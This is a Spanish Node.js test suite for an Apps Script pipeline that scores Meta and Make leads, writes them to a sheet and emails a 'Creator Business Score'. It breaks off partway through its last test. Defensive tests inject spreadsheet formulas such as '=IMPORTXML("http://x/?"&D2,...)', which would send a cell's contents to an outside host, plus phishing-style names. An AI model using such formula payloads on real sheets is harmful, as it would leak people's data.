/* Recorrido completo con los servicios de Apps Script simulados:
 * webhook → fila → puntaje → correo → estado, y todos los caminos de error. */
const assert = require('assert');
const { crearEntorno } = require('./entorno');

const TOKEN = 'secreto123';
let n = 0;
function prueba(nombre, fn) {
  try { fn(); n++; console.log('  ✔ ' + nombre); }
  catch (e) { console.log('  ✘ ' + nombre + '\n    ' + (e.stack || e).split('\n').slice(0, 4).join('\n    ')); process.exitCode = 1; }
}
const post = (api, cuerpo, token = TOKEN) => JSON.parse(api.doPost({ parameter: { token }, postData: { contents: JSON.stringify(cuerpo) } }).texto);
const leadMake = (extra = {}) => Object.assign({
  id_lead: '1203948576612345', nombre: 'ana maría lópez', email: 'Ana@Ejemplo.com ', telefono: '+52 55 1234 5678',
  comunidad: '20.000 a 100.000 seguidores', situacion: 'Estoy creciendo pero necesito equipo', producto: 'Modelo híbrido / Programa escalable',
  facturacion: '15.000 € – 40.000 €', problema: 'Caos en la entrega, equipo y operaciones', origen: 'ig'
}, extra);
const archivosMedallas = () => {
  const a = {};
  for (let v = 31; v <= 88; v++) for (const c of ['1.1', '1.2', '1.3', '2.1', '2.2', '2.3', '3.1', '3.2', '4.1', '4.2']) { a[`cbs-${v}-${c}.jpg`] = 'x'; a[`cbs-${v}-${c}-correo.jpg`] = 'x'; }
  return a;
};
/* Resultado esperado de leadMake(), calculado con el motor (la paridad con la landing la prueba paridad.js). */
function esperado(api, extra = {}) {
  const l = leadMake(extra);
  const t = { audiencia: l.comunidad, ritmo: l.situacion, modelo: l.producto, facturacion: l.facturacion, limitacion: l.problema };
  return api.evaluar(api.leerRespuestas(t).r);
}
/* Las pruebas del camino con medalla fuerzan MODO_CORREO 'medalla'; el predeterminado ('html') se prueba al final. */
const entorno = (o = {}) => crearEntorno(Object.assign({ props: { WEBHOOK_TOKEN: TOKEN }, archivos: archivosMedallas() }, o, { config: Object.assign({ MODO_CORREO: 'medalla', CARPETA_MEDALLAS_ID: 'carpeta-ok' }, o.config || {}) }));
const fila = (e, r) => {
  const enc = e.celdas[0].map(String);
  const f = e.celdas[r - 1];
  const o = {}; enc.forEach((h, i) => { o[h] = f[i]; }); return o;
};

const ENC_ = ['Fecha', 'ID lead', 'Nombre', 'Correo', 'Teléfono', 'Comunidad', 'Situación', 'Producto', 'Facturación', 'Problema', 'Origen', 'Puntaje', 'Puntaje real', 'Medalla', 'Caso', 'Diagnóstico', 'Desenlace', 'Estado', 'Enviado', 'Detalle', 'Intentos'];
const filaMake_ = (o = {}) => { const l = leadMake(o); return ['2026-09-25', l.id_lead, l.nombre, l.email, l.telefono, l.comunidad, l.situacion, l.producto, l.facturacion, l.problema, 'fb', '', '', '', '', '', '', o.estado || '', '', '', o.intentos || '']; };

console.log('Respuestas del formulario');
prueba('cada opción de la landing se reconoce tal cual', () => {
  const { api } = crearEntorno();
  api.PREGUNTAS.forEach((p) => p.opciones.forEach((o, i) => assert.strictEqual(api.emparejarOpcion(p, o.label), i, o.label)));
});
prueba('variantes que puede mandar Meta o Make: sin tildes, en_clave, sin puntos de miles, mayúsculas', () => {
  const { api } = crearEntorno();
  const [aud, rit, mod, fac, lim] = api.PREGUNTAS;
  assert.strictEqual(api.emparejarOpcion(aud, 'menos_de_1.000_seguidores_/_sin_comunidad'), 0);
  assert.strictEqual(api.emparejarOpcion(aud, 'MAS DE 100000 SEGUIDORES'), 4);
  assert.strictEqual(api.emparejarOpcion(aud, '20k a 100k seguidores'), 3);
  assert.strictEqual(api.emparejarOpcion(rit, 'atrapado en las tareas del dia a dia'), 0);
  assert.strictEqual(api.emparejarOpcion(mod, 'E-commerce/Producto fisico'), 5);
  assert.strictEqual(api.emparejarOpcion(mod, 'Coaching / Consultoria 1 a 1 por tiempo'), 2);
  assert.strictEqual(api.emparejarOpcion(fac, '1000 € - 5000 €'), 1);
  assert.strictEqual(api.emparejarOpcion(fac, 'Menos de 1000€'), 0);
  assert.strictEqual(api.emparejarOpcion(fac, '5.000 € – 15.000 €'), 2);
  assert.strictEqual(api.emparejarOpcion(lim, 'Cierre de llamadas y tasa de conversion'), 3);
});
prueba('lo que no es una opción no se adivina', () => {
  const { api } = crearEntorno();
  const [aud, , mod, fac] = api.PREGUNTAS;
  assert.strictEqual(api.emparejarOpcion(fac, '2.000 € – 3.000 €'), -1);
  assert.strictEqual(api.emparejarOpcion(fac, ''), -1);
  assert.strictEqual(api.emparejarOpcion(aud, 'seguidores'), -1);
  assert.strictEqual(api.emparejarOpcion(mod, 'Vendo camisetas'), -1);
});
prueba('ALIAS permite textos propios del formulario', () => {
  const { api } = crearEntorno({ config: { ALIAS: { facturacion: { 'Entre mil y cinco mil euros': 1 } } } });
  assert.strictEqual(api.emparejarOpcion(api.PREGUNTAS[3], 'entre mil y cinco mil euros'), 1);
});
prueba('encabezados: los de la plantilla y los títulos de las preguntas de Meta', () => {
  const { api } = crearEntorno();
  const m1 = api.mapearColumnas(['Fecha', 'ID lead', 'Nombre', 'Correo', 'Teléfono', 'Comunidad', 'Situación', 'Producto', 'Facturación', 'Problema', 'Estado', 'Puntaje', 'Puntaje real']);
  assert.deepStrictEqual([m1.email, m1.audiencia, m1.limitacion, m1.puntaje, m1.puntaje_real], [3, 5, 9, 11, 12]);
  const m2 = api.mapearColumnas(['id', 'created_time', 'full_name', 'email', 'phone_number',
    '¿De qué tamaño es tu comunidad o audiencia activa?', '¿Qué opción describe mejor tu situación actual y la de tu negocio digital?',
    '¿Qué producto o servicio vendes principalmente?', '¿Cuál es tu facturación mensual aproximada?', 'Si pudieras resolver UN solo problema hoy, ¿cuál sería?']);
  assert.deepStrictEqual([m2.id, m2.fecha, m2.nombre, m2.email, m2.telefono, m2.audiencia, m2.ritmo, m2.modelo, m2.facturacion, m2.limitacion], [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]);
});

console.log('Webhook de entrada');
prueba('sin token o con token incorrecto no escribe ni envía nada', () => {
  const e = entorno();
  assert.strictEqual(post(e.api, leadMake(), 'otro').ok, false);
  assert.strictEqual(post(e.api, leadMake(), '').ok, false);
  const e2 = crearEntorno();  // sin token configurado: rechaza siempre
  assert.strictEqual(post(e2.api, leadMake(), '').ok, false);
  assert.strictEqual(e.estado.correos.length + e2.estado.correos.length, 0);
  assert.ok(e.celdas.length <= 1);
});
prueba('lead de Make → fila nueva → correo al lead → resultado en la hoja', () => {
  const e = entorno();
  const r = post(e.api, leadMake());
  assert.strictEqual(r.ok, true); assert.strictEqual(r.fila, 2); assert.strictEqual(r.enviadas, 1);
  const c = e.estado.correos[0];
  assert.strictEqual(c.to, 'ana@ejemplo.com');
  const x = esperado(e.api);
  assert.deepStrictEqual([x.puntaje, x.puntajeVisible, x.claveCaso, x.franja.medalla, x.califica], [69, 74, '2.1', 'Plata', true]);
  assert.strictEqual(c.subject, 'Ana, tu Creator Business Score: 74/100 · Medalla de Plata');
  assert.strictEqual(c.name, 'Classroom Platinum by Kunfupay');
  assert.ok(c.inlineImages.medalla && c.htmlBody.includes('src="cid:medalla"'));
  assert.strictEqual(c.attachments[0].getName(), 'mi-medalla-creator-business-score.jpg');
  assert.strictEqual(c.inlineImages.medalla.datos, 'x');
  const f = fila(e, 2);
  assert.strictEqual(f.Estado, 'enviado'); assert.strictEqual(f.Puntaje, 74); assert.strictEqual(f['Puntaje real'], 69);
  assert.strictEqual(f.Medalla, 'Plata'); assert.strictEqual(f.Caso, '2.1'); assert.strictEqual(f['Diagnóstico'], 'Ventas y conversión'); assert.strictEqual(f.Desenlace, 'calificado');
  assert.strictEqual(f.Intentos, 1); assert.ok(f.Enviado instanceof Date); assert.strictEqual(f.Detalle, '');
  assert.strictEqual(f['Teléfono'], '+52 55 1234 5678');
  assert.strictEqual(e.estado.formulas.length, 0);
  assert.strictEqual(e.formatos[2], '@'); assert.strictEqual(e.formatos[5], '@');
});
prueba('el mismo lead dos veces (reintento de Make) → una sola fila y un solo correo', () => {
  const e = entorno();
  post(e.api, leadMake()); const r2 = post(e.api, leadMake());
  assert.strictEqual(r2.fila, 2); assert.strictEqual(e.estado.correos.length, 1); assert.strictEqual(e.celdas.filter((f) => f.some(String)).length, 2);
});
prueba('formato crudo de Meta (field_data) también entra', () => {
  const e = entorno();
  const r = post(e.api, { id: '999', created_time: '2026-09-25T10:00:00+0000', field_data: [
    { name: 'full_name', values: ['Luis Pérez'] }, { name: 'email', values: ['luis@ejemplo.com'] }, { name: 'phone_number', values: ['+34600111222'] },
    { name: '¿de_qué_tamaño_es_tu_comunidad_o_audiencia_activa?', values: ['1.000_a_5.000_seguidores'] },
    { name: '¿qué_opción_describe_mejor_tu_situación_actual_y_la_de_tu_negocio_digital?', values: ['atrapado_en_las_tareas_del_día_a_día'] },
    { name: '¿qué_producto_o_servicio_vendes_principalmente?', values: ['servicios_freelance_/_agencia_entregada_1_a_1'] },
    { name: '¿cuál_es_tu_facturación_mensual_aproximada?', values: ['menos_de_1.000_€'] },
    { name: 'si_pudieras_resolver_un_solo_problema_hoy,_¿cuál_sería?', values: ['hábitos,_rutinas_y_enfoque_del_fundador'] }] });
  assert.strictEqual(r.enviadas, 1);
  const f = fila(e, 2);
  assert.strictEqual(f['ID lead'], '999'); assert.strictEqual(f.Nombre, 'Luis Pérez'); assert.strictEqual(f.Caso, '4.1'); assert.strictEqual(f.Desenlace, 'descalificado');
  assert.ok(e.estado.correos[0].subject.startsWith('Luis, tu Creator Business Score: '));
});
prueba('un nombre con fórmula queda como texto: ni al añadir la fila ni al escribir el resultado se crea una fórmula', () => {
  const e = entorno();
  const r = post(e.api, leadMake({ id_lead: '1', nombre: '=IMPORTXML("http://x/?"&D2,"//a")<b>', problema: '=1+1' }));
  assert.strictEqual(r.ok, true);
  assert.strictEqual(e.estado.formulas.length, 0, JSON.stringify(e.estado.formulas));
  assert.strictEqual(fila(e, 2).Nombre, '=IMPORTXML("http://x/?"&D2,"//a")<b>');   // texto, como lo guarda Sheets
  assert.strictEqual(fila(e, 2).Estado, 'incompleto');
});
prueba('filas escritas por Make con texto "=…" en una respuesta: el script no reescribe esa celda', () => {
  const e = entorno({ filas: [ENC_, filaMake_({ nombre: '=HYPERLINK("http://x")' })] });
  e.api.procesarPendientes();
  assert.strictEqual(e.estado.formulas.length, 0);
  assert.strictEqual(fila(e, 2).Estado, 'enviado');
});
prueba('POST vacío solo procesa lo pendiente', () => {
  const e = entorno();
  const r = post(e.api, {});
  assert.strictEqual(r.ok, true); assert.strictEqual(r.fila, undefined); assert.strictEqual(r.procesadas, 0);
});

console.log('Filas que escribe otra herramienta (Make "Añadir fila")');
const ENC = ['Fecha', 'ID lead', 'Nombre', 'Correo', 'Teléfono', 'Comunidad', 'Situación', 'Producto', 'Facturación', 'Problema', 'Origen', 'Puntaje', 'Puntaje real', 'Medalla', 'Caso', 'Diagnóstico', 'Desenlace', 'Estado', 'Enviado', 'Detalle', 'Intentos'];
const filaMake = (o = {}) => { const l = leadMake(o); return ['2026-09-25', l.id_lead, l.nombre, l.email, l.telefono, l.comunidad, l.situacion, l.producto, l.facturacion, l.problema, 'fb', '', '', '', '', '', '', o.estado || '', '', '', o.intentos || '']; };
prueba('el reloj envía las filas nuevas y no toca las ya enviadas', () => {
  const e = entorno({ filas: [ENC, filaMake({ id_lead: 'a' }), filaMake({ id_lead: 'b', estado: 'enviado' }), filaMake({ id_lead: 'c' })] });
  const r = e.api.procesarPendientes();
  assert.deepStrictEqual([r.procesadas, r.enviadas], [2, 2]);
  assert.strictEqual(e.estado.correos.length, 2);
  assert.strictEqual(fila(e, 3).Puntaje, '');  // la ya enviada se queda como estaba
});
prueba('respuesta que no coincide → incompleto, sin correo, y dice cuál', () => {
  const e = entorno({ filas: [ENC, filaMake({ facturacion: 'Unos 3.000 al mes' })] });
  e.api.procesarPendientes();
  const f = fila(e, 2);
  assert.strictEqual(f.Estado, 'incompleto'); assert.ok(f.Detalle.includes('Facturación: "Unos 3.000 al mes"'));
  assert.strictEqual(e.estado.correos.length, 0);
});
prueba('correo no válido → omitido', () => {
  const e = entorno({ filas: [ENC, filaMake({ email: 'ana@@ejemplo' })] });
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, 'omitido'); assert.strictEqual(e.estado.correos.length, 0);
});
prueba('mismo ID de lead en dos filas → la segunda queda como duplicado', () => {
  const e = entorno({ filas: [ENC, filaMake({ id_lead: 'x' }), filaMake({ id_lead: 'x' })] });
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, 'enviado'); assert.strictEqual(fila(e, 3).Estado, 'duplicado'); assert.strictEqual(e.estado.correos.length, 1);
});
prueba('si falla el envío → error, y el siguiente ciclo lo reintenta', () => {
  const e = entorno({ filas: [ENC, filaMake()], fallarCorreo: 1 });
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, 'error'); assert.strictEqual(fila(e, 2).Intentos, 1); assert.ok(fila(e, 2).Detalle.includes('no disponible'));
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, 'enviado'); assert.strictEqual(fila(e, 2).Intentos, 2); assert.strictEqual(e.estado.correos.length, 1);
});
prueba('tras MAX_INTENTOS errores deja de reintentar', () => {
  const e = entorno({ filas: [ENC, filaMake()], fallarCorreo: 10 });
  for (let i = 0; i < 5; i++) e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Intentos, 3); assert.ok(fila(e, 2).Detalle.includes('sin más reintentos'));
});
prueba('una fila que se quedó en "enviando" no se reenvía sola: pasa a revisar', () => {
  const e = entorno({ filas: [ENC, filaMake({ estado: 'enviando' })] });
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, 'revisar'); assert.strictEqual(e.estado.correos.length, 0);
});
prueba('sin cuota diaria: deja la fila pendiente y lo anota', () => {
  const e = entorno({ filas: [ENC, filaMake()], cuota: 0 });
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, ''); assert.ok(fila(e, 2).Detalle.includes('cuota'));
});
prueba('hoja con otra disposición de columnas (títulos de Meta, sin columnas de resultado)', () => {
  const enc = ['id', 'created_time', 'email', 'full_name', 'phone_number', '¿Cuál es tu facturación mensual aproximada?', '¿De qué tamaño es tu comunidad o audiencia activa?',
    '¿Qué producto o servicio vendes principalmente?', 'Si pudieras resolver UN solo problema hoy, ¿cuál sería?', '¿Qué opción describe mejor tu situación actual y la de tu negocio digital?'];
  const e = entorno({ filas: [enc, ['77', 'hoy', 'eva@ejemplo.com', 'Eva', '600', 'Más de 50.000 €', 'Más de 100.000 seguidores', 'Mentoría grupal High-Ticket', 'Atracción de prospectos calificados', 'Tengo crecimiento predecible y controlado']] });
  e.api.procesarPendientes();
  const f = fila(e, 2);
  assert.strictEqual(f.Estado, 'enviado'); assert.strictEqual(f.Caso, '1.2'); assert.ok(e.celdas[0].includes('Puntaje real'));
});

console.log('Imágenes, botones y webhook de salida');
prueba('sin medallas en Drive: sale igual, con cabecera de texto, y lo anota', () => {
  const e = entorno({ filas: [ENC, filaMake()], archivos: {} });
  e.api.procesarPendientes();
  const c = e.estado.correos[0];
  assert.ok(!c.inlineImages && !c.attachments); assert.ok(c.htmlBody.includes('CREATOR BUSINESS SCORE'));
  assert.strictEqual(fila(e, 2).Estado, 'enviado'); assert.ok(fila(e, 2).Detalle.includes('Falta cbs-'));
});
prueba('carpeta de Drive mal configurada: sale igual, con aviso', () => {
  const e = entorno({ filas: [ENC, filaMake()], config: { CARPETA_MEDALLAS_ID: 'no-existe' } });
  e.api.procesarPendientes();
  assert.strictEqual(e.estado.correos.length, 1); assert.ok(fila(e, 2).Detalle.includes('Medalla no disponible'));
});
prueba('modo URL pública: imagen enlazada + botón de descarga + adjunto', () => {
  const e = entorno({ filas: [ENC, filaMake()], config: { CARPETA_MEDALLAS_ID: '', URL_BASE_MEDALLAS: 'https://kunfupay.com/m/' } });
  e.api.procesarPendientes();
  const c = e.estado.correos[0];
  assert.ok(c.htmlBody.includes('src="https://kunfupay.com/m/cbs-74-2.1-correo.jpg"'));
  assert.ok(c.htmlBody.includes('href="https://kunfupay.com/m/cbs-74-2.1.jpg"'));
  assert.strictEqual(c.attachments.length, 1);
});
prueba('botón de Classroom con las UTMs de la landing (+ utm_medium=email)', () => {
  const e = entorno({ filas: [ENC, filaMake()] });
  e.api.procesarPendientes();
  const html = e.estado.correos[0].htmlBody;
  assert.ok(html.includes('href="https://kunfupay.com/landings/classroom-platinum/gracias?utm_medium=email&amp;utm_term=calificado_si&amp;utm_content=score_69"'));
  assert.ok(html.includes('Aplicar a Classroom Platinum')); assert.ok(!html.includes('Con Kunfupay simplificas'));
});
prueba('no califica: botón naranja de Kunfupay (conserva sus UTMs) y paso 04', () => {
  const e = entorno({ filas: [ENC, filaMake({ facturacion: 'Menos de 1.000 €', comunidad: '1.000 a 5.000 seguidores' })] });
  e.api.procesarPendientes();
  const html = e.estado.correos[0].htmlBody;
  assert.ok(html.includes('https://kunfupay.com/?utm_source=CBS&amp;utm_campaign=bio&amp;utm_medium=email&amp;utm_term=calificado_no&amp;utm_content=score_'));
  assert.ok(html.includes('Empezar con Kunfupay') && html.includes('Con Kunfupay simplificas cada venta') && html.includes('Fase de ordenar'));
});
prueba('e-commerce: fuera de perfil, sin botón ni paso 04', () => {
  const e = entorno({ filas: [ENC, filaMake({ producto: 'E-commerce / Producto físico' })] });
  e.api.procesarPendientes();
  const html = e.estado.correos[0].htmlBody;
  assert.ok(html.includes('Fuera del perfil de Platinum') && html.includes('no te pedimos que apliques'));
  assert.ok(!html.includes('Aplicar a Classroom') && !html.includes('Empezar con Kunfupay') && !html.includes('Con Kunfupay simplificas'));
  assert.strictEqual(fila(e, 2).Desenlace, 'no_aplica');
});
prueba('webhook de salida: manda el resultado con el puntaje REAL; si falla, el correo sigue enviado', () => {
  const e = entorno({ filas: [ENC, filaMake()], config: { WEBHOOK_SALIDA: 'https://crm.test/hook' }, respuestaFetch: 500 });
  e.api.procesarPendientes();
  const f = e.estado.fetches.find((x) => x.url === 'https://crm.test/hook');
  const cuerpo = JSON.parse(f.o.payload);
  assert.strictEqual(cuerpo.puntaje, 69); assert.strictEqual(cuerpo.puntaje_visible, 74); assert.strictEqual(cuerpo.califica, true);
  assert.strictEqual(cuerpo.comunidad, '20.000 a 100.000 seguidores'); assert.strictEqual(cuerpo.email, 'ana@ejemplo.com');
  assert.strictEqual(fila(e, 2).Estado, 'enviado'); assert.ok(fila(e, 2).Detalle.includes('respondió 500'));
});
prueba('configurar(): genera token, una sola alarma aunque se ejecute dos veces', () => {
  const e = crearEntorno();
  e.api.configurar(); e.api.configurar();
  assert.ok(e.estado.props.WEBHOOK_TOKEN.length >= 30); assert.strictEqual(e.estado.props.HOJA_ID, 'hoja-de-prueba');
  assert.strictEqual(e.estado.triggers.length, 1); assert.strictEqual(e.estado.triggers[0].n, 5);
  assert.deepStrictEqual(e.celdas[0].slice(0, 4), ['Fecha', 'ID lead', 'Nombre', 'Correo']);
});
prueba('enviarPruebas(): los tres desenlaces a mi correo, sin tocar la hoja', () => {
  const e = entorno();
  e.api.enviarPruebas();
  assert.deepStrictEqual(e.estado.correos.map((c) => c.to), ['yo@kunfupay.com', 'yo@kunfupay.com', 'yo@kunfupay.com']);
  const s = e.estado.correos.map((c) => c.htmlBody);
  assert.ok(s[0].includes('Calificas para aplicar') && s[1].includes('Fase de ordenar') && s[2].includes('Fuera del perfil'));
});
prueba('el HTML del correo es ligero (Gmail recorta por encima de ~102 KB)', () => {
  const e = entorno({ filas: [ENC, filaMake({ facturacion: 'Menos de 1.000 €' })] });
  e.api.procesarPendientes();
  const kb = Buffer.byteLength(e.estado.correos[0].htmlBody) / 1024;
  assert.ok(kb < 60, kb.toFixed(1) + ' KB');
});

console.log('Hallazgos de la revisión');
prueba('cerrojo ocupado: el lead se guarda igual y Make recibe ok:true (sale en la próxima pasada)', () => {
  const e = entorno({ cerrojoOcupado: true });
  const r = post(e.api, leadMake());
  assert.strictEqual(r.ok, true); assert.ok(/próxima pasada/.test(r.nota));
  assert.strictEqual(fila(e, 2).Correo, 'Ana@Ejemplo.com'); assert.strictEqual(fila(e, 2).Estado, '');
  e.estado.cerrojoOcupado = false;
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, 'enviado'); assert.strictEqual(e.estado.correos.length, 1);
});
prueba('reintento de Make con el cerrojo ocupado: se añade la fila, pero sale como duplicado y un solo correo', () => {
  const e = entorno();
  post(e.api, leadMake());
  e.estado.cerrojoOcupado = true; post(e.api, leadMake()); e.estado.cerrojoOcupado = false;
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 3).Estado, 'duplicado'); assert.strictEqual(e.estado.correos.length, 1);
});
prueba('el webhook atiende primero su fila y como mucho 3: el atasco lo vacía el reloj', () => {
  const filas = [ENC_];
  for (let i = 0; i < 10; i++) filas.push(filaMake_({ id_lead: 'viejo' + i }));
  const e = entorno({ filas });
  const r = post(e.api, leadMake({ id_lead: 'nuevo', email: 'nuevo@ejemplo.com' }));
  assert.strictEqual(r.fila, 12); assert.strictEqual(r.procesadas, 3);
  assert.strictEqual(e.estado.correos[0].to, 'nuevo@ejemplo.com');
  e.api.procesarPendientes();
  assert.strictEqual(e.estado.correos.length, 11);
});
prueba('cuerpo ilegible (ni JSON ni campos) → ok:false y no escribe nada', () => {
  const e = entorno();
  const r = JSON.parse(e.api.doPost({ parameter: { token: TOKEN }, postData: { contents: '{roto' } }).texto);
  assert.strictEqual(r.ok, false); assert.ok(e.celdas.length <= 1); assert.strictEqual(e.estado.errores.length, 1);
});
prueba('form-urlencoded (como lo manda Make): los campos llegan en e.parameter', () => {
  const e = entorno();
  const l = leadMake();
  const r = JSON.parse(e.api.doPost({ parameter: Object.assign({ token: TOKEN }, l), postData: { contents: 'id_lead=...&email=...' } }).texto);
  assert.strictEqual(r.ok, true); assert.strictEqual(r.enviadas, 1);
});
prueba('lead sin correo → fila "omitido" con el motivo, sin quedarse pendiente para siempre', () => {
  const e = entorno();
  const r = post(e.api, leadMake({ email: '' }));
  assert.strictEqual(r.ok, true); assert.strictEqual(fila(e, 2).Estado, 'omitido'); assert.ok(fila(e, 2).Detalle.includes('sin correo'));
});
prueba('si alguien ordena la hoja mientras se envía, no se escribe el resultado encima de otro lead', () => {
  const e = entorno({
    filas: [ENC_, filaMake_({ id_lead: 'A', email: 'a@ejemplo.com' }), filaMake_({ id_lead: 'B', email: 'b@ejemplo.com' })],
    alEnviar: (celdas) => { if (celdas[1][1] === 'A') { const t = celdas[1]; celdas[1] = celdas[2]; celdas[2] = t; } }
  });
  e.api.procesarPendientes();
  // A se envió y quedó en la fila 3 como "enviando" (no se pudo confirmar); B, ahora en la 2, no recibió el resultado de A.
  const f2 = fila(e, 2), f3 = fila(e, 3);
  assert.strictEqual(f2['ID lead'], 'B'); assert.notStrictEqual(f2.Estado, 'enviando');
  assert.strictEqual(f3['ID lead'], 'A'); assert.strictEqual(f3.Estado, 'enviando');
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 3).Estado, 'revisar');
});
prueba('con copia oculta y cuota justa: no gasta intentos, espera cuota', () => {
  const e = entorno({ filas: [ENC_, filaMake_()], cuota: 1, config: { COPIA_OCULTA: 'equipo@kunfupay.com' } });
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, ''); assert.strictEqual(fila(e, 2).Intentos, ''); assert.strictEqual(e.estado.correos.length, 0);
});
prueba('si MailApp dice "too many times" a mitad de envío: no cuenta como intento y queda pendiente', () => {
  const e = entorno({ filas: [ENC_, filaMake_({ estado: 'error', intentos: 2 })], fallarCorreo: 1, errorCorreo: 'Service invoked too many times for one day: email.' });
  e.api.procesarPendientes();
  assert.strictEqual(fila(e, 2).Estado, ''); assert.strictEqual(fila(e, 2).Intentos, 2); assert.ok(fila(e, 2).Detalle.includes('cuota'));
});
prueba('el nombre solo se usa si son letras: nada de enlaces ni avisos en el asunto', () => {
  const { api } = crearEntorno();
  assert.strictEqual(api.primerNombre('josé luis'), 'José');
  assert.strictEqual(api.primerNombre('ANA-MARÍA'), 'Ana-maría');
  assert.strictEqual(api.primerNombre('Zoë'), 'Zoë');
  assert.strictEqual(api.primerNombre('www.premio-kunfupay.com'), '');
  assert.strictEqual(api.primerNombre('URGENTE:'), '');
  assert.strictEqual(api.primerNombre('Ana\u3164verifica-tu-cuenta.com'), 'Ana');
  assert.strictEqual(api.primerNombre('=HYPERLINK'), '');
});
prueba('medalla en la papelera: se ignora y se busca otra; si no hay, sale con cabecera de texto', () => {
  const e = entorno({ filas: [ENC_, filaMake_()], papelera: ['cbs-74-2.1-correo.jpg'] });
  e.api.procesarPendientes();
  assert.ok(!e.estado.correos[0].inlineImages); assert.ok(fila(e, 2).Detalle.includes('Falta cbs-74-2.1-correo.jpg'));
});
prueba('el correo: hoja blanca en HTML (no en la imagen), botones con relleno para Outlook, fuente web fuera de Outlook, pie con la baja', () => {
  const e = entorno({ filas: [ENC_, filaMake_({ facturacion: 'Menos de 1.000 €' })], config: { RESPONDER_A: 'hola@kunfupay.com' } });
  e.api.procesarPendientes();
  const c = e.estado.correos[0];
  assert.ok(c.htmlBody.includes('border-radius:28px 28px 0 0'));
  assert.ok(c.htmlBody.includes('mso-padding-alt:16px 34px'));
  assert.ok(c.htmlBody.includes('<!--[if !mso]><!--><link href="https://fonts.googleapis.com'));
  assert.ok(c.htmlBody.includes('<!--[if mso]><table role="presentation" width="600"'));
  assert.ok(c.htmlBody.includes('mailto:hola@kunfupay.com?subject=Baja') && c.body.includes('escribe a hola@kunfupay.com'));
  assert.strictEqual(c.replyTo, 'hola@kunfupay.com');
});
prueba('importar medallas: crea la carpeta junto a la hoja, descarga las que faltan y no duplica al repetir', () => {
  const lista = ['cbs-31-4.1.jpg', 'cbs-31-4.1-correo.jpg', 'cbs-32-4.1.jpg'];
  const e = crearEntorno({ props: { HOJA_ID: 'hoja-de-prueba' }, listaMedallas: lista });
  const r1 = e.api.importarMedallas();
  assert.deepStrictEqual(e.estado.carpetasCreadas, ['Medallas · Creator Business Score']);
  assert.strictEqual(e.estado.props.CARPETA_MEDALLAS_ID, 'carpeta-ok');
  assert.deepStrictEqual([r1.importadas, r1.quedan], [3, 0]);
  assert.ok(e.estado.tiposCreados.every((t) => t === 'image/jpeg'));
  assert.ok(e.estado.fetches.some((f) => f.url.includes('/medallas/img/cbs-31-4.1-correo.jpg')));
  const r2 = e.api.importarMedallas();
  assert.strictEqual(r2.importadas, 0); assert.strictEqual(e.estado.carpetasCreadas.length, 1);
  assert.strictEqual(e.api.carpetaMedallasId(), 'carpeta-ok');
});
prueba('"Ver token del webhook" muestra el token y explica de dónde sacar la URL /exec', () => {
  const e = entorno();
  e.api.mostrarWebhook();
  const a = e.estado.alertas[0];
  assert.ok(a.x.includes('?token=' + TOKEN) && a.x.includes('Gestionar implementaciones') && a.x.includes('incógnito'));
});

console.log('\nCorreo 100 % HTML (MODO_CORREO predeterminado) y hoja tal cual la deja Meta');
const ENC_META = ['id', 'created_time', 'ad_id', 'ad_name', 'adset_id', 'adset_name', 'campaign_id', 'campaign_name', 'form_id', 'form_name', 'is_organic', 'platform',
  '¿de_qué_tamaño_es_tu_comunidad_o_audiencia_activa?', '¿qué_opción_describe_mejor_tu_situación_actual_y_la_de_tu_negocio_digital?', '¿qué_producto_o_servicio_vendes_principalmente?',
  '¿cuál_es_tu_facturación_mensual_aproximada?', 'si_pudieras_resolver_un_solo_problema_hoy,_¿cuál_sería?', 'nombre_completo', 'correo_electrónico', 'phone_number', 'lead_status'];
const filaMeta = (o = {}) => { const l = leadMake(o); return ['l:' + l.id_lead, '2026-09-25T03:22:30-05:00', '', '', '', '', '', '', 'f:2163216630956791', 'Creator Business Score - Classroom Platinum', 'true', 'ig', l.comunidad, l.situacion, l.producto, l.facturacion, l.problema, l.nombre, l.email, 'p:' + l.telefono, 'OK']; };
const dummy = (c) => '<test lead: dummy data for ' + c + '>';
prueba('modo html (predeterminado): sin imágenes ni adjuntos, con dial, pastillas, barras y botón; no necesita medallas', () => {
  const e = crearEntorno({ props: { WEBHOOK_TOKEN: TOKEN } });   // sin carpeta de medallas ni archivos
  const r = post(e.api, leadMake());
  assert.strictEqual(r.enviadas, 1);
  const c = e.estado.correos[0];
  assert.ok(!c.inlineImages && !c.attachments);
  assert.ok(!/<img\b/i.test(c.htmlBody) && !/url\(/.test(c.htmlBody) && !/<svg/.test(c.htmlBody));
  assert.ok(c.htmlBody.includes('>74<span') && c.htmlBody.includes('Medalla de Plata') && c.htmlBody.includes('Tu cuello de botella: Ventas y conversión'));
  assert.ok(c.htmlBody.includes('width="68%" bgcolor="#6347ff"') && c.htmlBody.includes('Aplicar a Classroom Platinum'));
  assert.ok(c.htmlBody.includes('utm_medium=email&amp;utm_term=calificado_si&amp;utm_content=score_69'));
  assert.ok(c.htmlBody.includes('Eres candidato a Classroom Platinum'));
  assert.ok(c.body.includes('74/100 · Medalla de Plata') && !c.body.includes('adjunta'));
  assert.strictEqual(c.subject, 'Ana, tu Creator Business Score: 74/100 · Medalla de Plata');
  assert.strictEqual(fila(e, 2).Estado, 'enviado'); assert.strictEqual(fila(e, 2).Detalle, '');
  assert.ok(c.htmlBody.length < 40000);
});
prueba('modo html: no califica → botón naranja de Kunfupay y paso 04; e-commerce → sin botón, sin bloque Platinum', () => {
  const e = crearEntorno({ props: { WEBHOOK_TOKEN: TOKEN } });
  post(e.api, leadMake({ id_lead: '1', facturacion: 'Menos de 1.000 €' }));
  post(e.api, leadMake({ id_lead: '2', email: 'eva@ejemplo.com', producto: 'E-commerce / Producto físico' }));
  const [a, b] = e.estado.correos;
